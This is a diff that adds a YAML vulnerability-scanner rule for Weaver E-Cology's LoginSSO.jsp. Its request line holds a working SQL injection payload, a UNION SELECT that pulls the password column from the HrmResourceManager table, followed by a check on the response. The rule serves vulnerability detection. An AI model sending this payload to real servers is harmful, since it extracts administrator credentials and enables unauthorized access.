@@ -1,0 +1,11 @@
+name: ecology-loginsso-sql
+rules:
+  r0:
+    request:
+      method: GET
+      path: /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager
+    expression: response.status == 200 && response.body.bcontains(b'<BODY>\r\n<pre>\r\n<code>')&& response.body.bcontains(b'</code>\r\n</pre>\r\n</BODY>\r\n</HTML>')
+expression: r0()
+detail:
+    links:
+        - E-Cology LoginSSO.jsp SQL注入
